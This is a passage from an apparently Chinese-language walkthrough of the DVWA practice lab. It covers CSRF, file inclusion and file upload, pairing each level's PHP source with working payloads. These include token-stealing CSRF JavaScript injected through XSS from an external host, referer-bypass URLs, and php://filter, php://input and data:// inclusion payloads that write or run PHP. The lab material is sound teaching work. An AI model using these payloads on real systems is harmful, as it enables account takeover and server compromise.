        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"change"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-string">'csrf'</span>].<span class="hljs-title function_">submit</span>();</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
<p>当用户访问该页面的时候由于<code>&lt;script&gt;document.forms['csrf'].submit();&lt;/script&gt;</code>的执行，导致用户自动提交给了上面表单内容，进行密码的修改。</p>
<p>接下来就是对于该html页面网址的构造了</p>
<p>**目录混淆：**将上述 html 页面放到服务器的 <code>127.0.0.1</code> 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址：</p>
<pre><code class="hljs http">http://www.sqlsec.com/127.0.0.1/csrf.html</code></pre>
<p>**文件名混淆：**将上述 html 文件重命名为 <code>127.0.0.1.html</code>，然后访问如下 payload：</p>
<pre><code class="hljs http">http://www.sqlsec.com/127.0.0.1.html</code></pre>
<p>这里有师傅提醒：<strong>这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败，具体自行测试。</strong></p>
<p><strong>？拼接混淆referer</strong>：</p>
<pre><code class="hljs http">http://www.sqlsec.com/csrf.html?127.0.0.1</code></pre>
<p>因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。</p>
<h2 id="high">High</h2>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'REQUEST_METHOD'</span>] == <span class="hljs-string">"POST"</span> &amp;&amp; <span class="hljs-title function_ invoke__">array_key_exists</span> (<span class="hljs-string">"CONTENT_TYPE"</span>, <span class="hljs-variable">$_SERVER</span>) &amp;&amp; <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'CONTENT_TYPE'</span>] == <span class="hljs-string">"application/json"</span>) {
    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'php://input'</span>), <span class="hljs-literal">true</span>);
    <span class="hljs-variable">$request_type</span> = <span class="hljs-string">"json"</span>;
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"HTTP_USER_TOKEN"</span>, <span class="hljs-variable">$_SERVER</span>) &amp;&amp;
        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_new"</span>, <span class="hljs-variable">$data</span>) &amp;&amp;
        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_conf"</span>, <span class="hljs-variable">$data</span>) &amp;&amp;
        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"Change"</span>, <span class="hljs-variable">$data</span>)) {
        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">'HTTP_USER_TOKEN'</span>];
        <span class="hljs-variable">$pass_new</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">"password_new"</span>];
        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$data</span>[<span class="hljs-string">"password_conf"</span>];
        <span class="hljs-variable">$change</span> = <span class="hljs-literal">true</span>;
    }
} <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"user_token"</span>, <span class="hljs-variable">$_REQUEST</span>) &amp;&amp;
        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_new"</span>, <span class="hljs-variable">$_REQUEST</span>) &amp;&amp;
        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"password_conf"</span>, <span class="hljs-variable">$_REQUEST</span>) &amp;&amp;
        <span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-string">"Change"</span>, <span class="hljs-variable">$_REQUEST</span>)) {
        <span class="hljs-variable">$token</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"user_token"</span>];
        <span class="hljs-variable">$pass_new</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"password_new"</span>];
        <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"password_conf"</span>];
        <span class="hljs-variable">$change</span> = <span class="hljs-literal">true</span>;
    }
}</code></pre>
<p>这串代码主要是判断用户传入的数据是否为json类型，如果是的话，进行json解密传给data，接着判断是否存在四个指定的变量，如果存在，则各自赋值。如果不是json数据类型，则仍然判断是否存在这四个变量，如果存在则分别赋值</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$change</span>) {
    <span class="hljs-comment">// Check Anti-CSRF token</span>
    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$token</span>, <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">'session_token'</span> ], <span class="hljs-string">'index.php'</span> );
    <span class="hljs-comment">// Do the passwords match?</span>
    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) {
        <span class="hljs-comment">// They do!</span>
        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span> (<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>], <span class="hljs-variable">$pass_new</span>);
        <span class="hljs-variable">$pass_new</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass_new</span> );

        <span class="hljs-comment">// Update the database</span>
        <span class="hljs-variable">$insert</span> = <span class="hljs-string">"UPDATE `users` SET password = '"</span> . <span class="hljs-variable">$pass_new</span> . <span class="hljs-string">"' WHERE user = '"</span> . <span class="hljs-title function_ invoke__">dvwaCurrentUser</span>() . <span class="hljs-string">"';"</span>;
        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>],  <span class="hljs-variable">$insert</span> );

        <span class="hljs-comment">// Feedback for the user</span>
        <span class="hljs-variable">$return_message</span> = <span class="hljs-string">"Password Changed."</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Issue with passwords matching</span>
        <span class="hljs-variable">$return_message</span> = <span class="hljs-string">"Passwords did not match."</span>;
    }

    <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">"___mysqli_ston"</span>]);

    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$request_type</span> == <span class="hljs-string">"json"</span>) {
        <span class="hljs-title function_ invoke__">generateSessionToken</span>();
        <span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">"Content-Type: application/json"</span>);
        <span class="hljs-keyword">print</span> <span class="hljs-title function_ invoke__">json_encode</span> (<span class="hljs-keyword">array</span>(<span class="hljs-string">"Message"</span> =&gt;<span class="hljs-variable">$return_message</span>));
        <span class="hljs-keyword">exit</span>;
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;"</span> . <span class="hljs-variable">$return_message</span> . <span class="hljs-string">"&lt;/pre&gt;"</span>;
    }
}

<span class="hljs-comment">// Generate Anti-CSRF token</span>
<span class="hljs-title function_ invoke__">generateSessionToken</span>();
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里显示检查了用户token是否与session匹配，然后判断两次密码输入是否一致，如果一致则直接进行密码的更新，同时防止了SQL注入的可能。</p>
<p>很明显这里并不能有效的阻止CSRF的存在，只要我们想办法可以获取到用户的token即可成功攻击。</p>
<h3 id="js发起http-csrf请求">JS发起HTTP CSRF请求</h3>
<p>新建一个csrf.js文件：</p>
<pre><code class="hljs js"><span class="hljs-comment">// 首先访问这个页面 来获取 token</span>
<span class="hljs-keyword">var</span> tokenUrl = <span class="hljs-string">'http://127.0.0.1/dvwa/vulnerabilities/csrf/'</span>;

<span class="hljs-keyword">if</span>(<span class="hljs-variable language_">window</span>.<span class="hljs-property">XMLHttpRequest</span>) {
    xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();
}<span class="hljs-keyword">else</span>{
    xmlhttp = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ActiveXObject</span>(<span class="hljs-string">"Microsoft.XMLHTTP"</span>);
}

<span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span>;
xmlhttp.<span class="hljs-property">withCredentials</span> = <span class="hljs-literal">true</span>;
xmlhttp.<span class="hljs-property">onreadystatechange</span>=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>){
    <span class="hljs-keyword">if</span>(xmlhttp.<span class="hljs-property">readyState</span> ==<span class="hljs-number">4</span> &amp;&amp; xmlhttp.<span class="hljs-property">status</span>==<span class="hljs-number">200</span>)
    {
          <span class="hljs-comment">// 使用正则提取 token</span>
        <span class="hljs-keyword">var</span> text = xmlhttp.<span class="hljs-property">responseText</span>;
        <span class="hljs-keyword">var</span> regex = <span class="hljs-regexp">/user_token\' value\=\'(.*?)\' \/\&gt;/</span>;
        <span class="hljs-keyword">var</span> match = text.<span class="hljs-title function_">match</span>(regex);
        <span class="hljs-keyword">var</span> token = match[<span class="hljs-number">1</span>];
          <span class="hljs-comment">// 发起 CSRF 请求 将 token 带入</span>
        <span class="hljs-keyword">var</span> new_url = <span class="hljs-string">'http://127.0.0.1/dvwa/vulnerabilities/csrf/?user_token='</span>+token+<span class="hljs-string">'&amp;password_new=123456&amp;password_conf=123456&amp;Change=Change'</span>;
        <span class="hljs-keyword">if</span>(count==<span class="hljs-number">0</span>){
            count++;
            xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">"GET"</span>,new_url,<span class="hljs-literal">false</span>);
            xmlhttp.<span class="hljs-title function_">send</span>();
        }
    }
};
xmlhttp.<span class="hljs-title function_">open</span>(<span class="hljs-string">"GET"</span>,tokenUrl,<span class="hljs-literal">false</span>);
xmlhttp.<span class="hljs-title function_">send</span>();</code></pre>
<p>将这个 csrf.js 上传到外网的服务器上，<code>http://your-website/csrf.js</code>，随后访问dvwa的xss high级别，插入恶意js代码</p>
<pre><code class="hljs http">http://127.0.0.1/dvwa/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src="http://your-website/csrf.js"&gt;&lt;/script&gt;</code></pre>
<p>这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 123456 了</p>
<p>另外这里学习了国光师傅的另一种思路：</p>
<h3 id="常规-html-发起-csrf-请求">常规 HTML 发起 CSRF 请求</h3>
<p>假设攻击者这里可以将 HTML 保存上传到 CORS 的跨域白名单下的话，那么这里也可以通过 HTML 这种组合式的 CSRF 攻击。</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span>
<span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params"></span>){</span>
<span class="language-javascript">    <span class="hljs-keyword">var</span> token = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"get_token"</span>).<span class="hljs-property">contentWindow</span>.<span class="hljs-property">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">'user_token'</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span></span>
<span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">'user_token'</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>=token;</span>
<span class="language-javascript">    <span class="hljs-title function_">alert</span>(token);</span>
<span class="language-javascript">    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"csrf"</span>).<span class="hljs-title function_">submit</span>();</span>
<span class="language-javascript">  }</span>
<span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"get_token"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"display:none;"</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">"attack()"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">"GET"</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"csrf"</span> <span class="hljs-attr">action</span>=<span class="hljs-string">"http://127.0.0.1/dvwa/vulnerabilities/csrf/"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_new"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password_conf"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"123456"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"user_token"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">""</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"hidden"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Change"</span> <span class="hljs-attr">value</span>=<span class="hljs-string">"Change"</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span></code></pre>
<p>将上述文件保存为 csrf.html 然后放入到 CORS 白名单目录下，这在实战中比较少见，这里为了演示效果，我们可以将这个文件放入到靶场服务器的根目录下，然后直接访问这个页面即可发起 CSRF 攻击：</p>
<pre><code class="hljs scss">http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/dvwa/csrf.html</code></pre>
<h2 id="impossible">Impossible</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212049060.png" alt="image-20240111212049060"></p>
<p>与之前的级别不同点在于，这里增加了一个输入框，要求用户写出当前密码，只有当前密码是正确的，才会执行修改密码的操作。</p>
<p>这对于不知道受害者原始密码的攻击者来说，根本无法完成CSRF攻击了。</p>
<h1 id="0x04-file-inclusion">0x04 File Inclusion</h1>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// The page we wish to display</span>
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];
<span class="hljs-meta">?&gt;</span></code></pre>
<p>可以看到非常捡漏，对于page参数没有做任何限制，这意味着我们可以实现任意文件包含，而这里的包含函数并不在此代码中。</p>
<h3 id="文件读取">文件读取</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212751466.png" alt="image-20240111212751466"></p>
<p>正常在linux下是是要读取/etc/passwd等文件的</p>
<h3 id="远程文件包含">远程文件包含</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111212836673.png" alt="image-20240111212836673"></p>
<h3 id="本地文件包含-getshell">本地文件包含 Getshell</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213022537.png" alt="image-20240111213022537"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213001264.png" alt="image-20240111213001264"></p>
<p>这里需要匹配文件上传漏洞，来进行本地包含</p>
<h3 id="远程文件包含-getshell">远程文件包含 Getshell</h3>
<p>当然这里也可以包含远程服务器上的恶意文件getshell，就不演示了</p>
<h3 id="伪协议读取">伪协议读取</h3>
<p><code>php://filter</code></p>
<pre><code class="hljs php">?page=php:<span class="hljs-comment">//filter/convert.base64-encode/resource=index.php</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213224202.png" alt="image-20240111213224202"></p>
<p>解码即可</p>
<p><code>php://input getshell</code></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'info.php'</span>,<span class="hljs-string">'w'</span>),<span class="hljs-string">'&lt;?php phpinfo();?&gt;'</span>)<span class="hljs-meta">?&gt;</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111213429717.png" alt="image-20240111213429717"></p>
<p>不过这里不知道是和原因，hackbar发不出去，只能bp发送</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214209787.png" alt="image-20240111214209787"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214156755.png" alt="image-20240111214156755"></p>
<p><code>data:// 伪协议</code></p>
<p>数据封装器，和 php:// 相似，可以直接执行任意 PHP 代码：</p>
<pre><code class="hljs php">/fi/?page=data:text/plain,<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span>
/fi/?page=data:text/plain;base64, PD9waHAgcGhwaW5mbygpOz8%<span class="hljs-number">2</span>b</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214323842.png" alt="image-20240111214323842"></p>
<h2 id="medium">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// The page we wish to display</span>
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];
<span class="hljs-comment">// Input validation</span>
<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">"http://"</span>, <span class="hljs-string">"https://"</span> ), <span class="hljs-string">""</span>, <span class="hljs-variable">$file</span> );
<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">"../"</span>, <span class="hljs-string">"..\\"</span> ), <span class="hljs-string">""</span>, <span class="hljs-variable">$file</span> );
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里加了几个过滤，将http协议与https协议过滤为空，以及防止目录穿越。</p>
<p>但这里我们注意到没有过滤伪协议，以及它仅仅是将敏感字符过滤为空，这意味着我们可以双写绕过</p>
<pre><code class="hljs scss">?page=....<span class="hljs-comment">//....//....//flag.txt</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214557607.png" alt="image-20240111214557607"></p>
<p>同样的远程文件包含也可以双写绕过</p>
<pre><code class="hljs scss">?page=hhttp://ttp://www.baidu.com/robots.txt</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111214750871.png" alt="image-20240111214750871"></p>
<h2 id="high">High</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// The page we wish to display</span>
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];

<span class="hljs-comment">// Input validation</span>
<span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">fnmatch</span>( <span class="hljs-string">"file*"</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"include.php"</span> ) {
    <span class="hljs-comment">// This isn't the page we want!</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>;
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里说如果page参数不是以file开头的，或者不是include.php，则exit退出，很明显可以用file伪协议</p>
<h2 id="impossible">Impossible</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-comment">// The page we wish to display</span>
<span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ];

<span class="hljs-comment">// Only allow include.php or file{1..3}.php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-variable">$file</span> != <span class="hljs-string">"include.php"</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"file1.php"</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"file2.php"</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"file3.php"</span> ) {
    <span class="hljs-comment">// This isn't the page we want!</span>
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>;
    <span class="hljs-keyword">exit</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>这里进行了白名单过滤，如果不是这三个指定文件中的一个，则exit退出，很明显我们无法进行攻击了。</p>
<h1 id="0x05-file-upload">0x05 File Upload</h1>
<h2 id="low">Low</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {
    <span class="hljs-comment">// Where are we going to be writing to?</span>
    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">"hackable/uploads/"</span>;
    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ] );

    <span class="hljs-comment">// Can we move the file to the upload folder?</span>
    <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ], <span class="hljs-variable">$target_path</span> ) ) {
        <span class="hljs-comment">// No</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Yes!</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>首先自定义了上传路径，接着直接对upload参数内容进行上传，并没有对内容做出过滤。很明显可以任意文件上传</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111215609154.png" alt="image-20240111215609154"></p>
<p>这里将上传文件路径输出了，直接跟着路径访问即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240111215640275.png" alt="image-20240111215640275"></p>
<h2 id="medium">Medium</h2>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">'Upload'</span> ] ) ) {
    <span class="hljs-comment">// Where are we going to be writing to?</span>
    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">"hackable/uploads/"</span>;
    <span class="hljs-variable">$target_path</span> .= <span class="hljs-title function_ invoke__">basename</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ] );

    <span class="hljs-comment">// File information</span>
    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'name'</span> ];
    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'type'</span> ];
    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'size'</span> ];

    <span class="hljs-comment">// Is it an image?</span>
    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">"image/jpeg"</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">"image/png"</span> ) &amp;&amp;
        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) {

        <span class="hljs-comment">// Can we move the file to the upload folder?</span>
        <span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">move_uploaded_file</span>( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">'uploaded'</span> ][ <span class="hljs-string">'tmp_name'</span> ], <span class="hljs-variable">$target_path</span> ) ) {
            <span class="hljs-comment">// No</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'</span>;
        }
        <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// Yes!</span>
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;pre&gt;<span class="hljs-subst">{$target_path}</span> succesfully uploaded!&lt;/pre&gt;"</span>;
        }
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// Invalid file</span>
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'</span>;
    }
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>依旧是定义了上传路径，接着取出了上传文件的文件名，文件类型，文件大小。</p>
<p>如果文件类型不是jpeg或者png，且文件上传大小超出了限制，则上传失败，否则成功上传。</p>
<p>但这里只是对content-type做出了限制，我们修改即可</p>
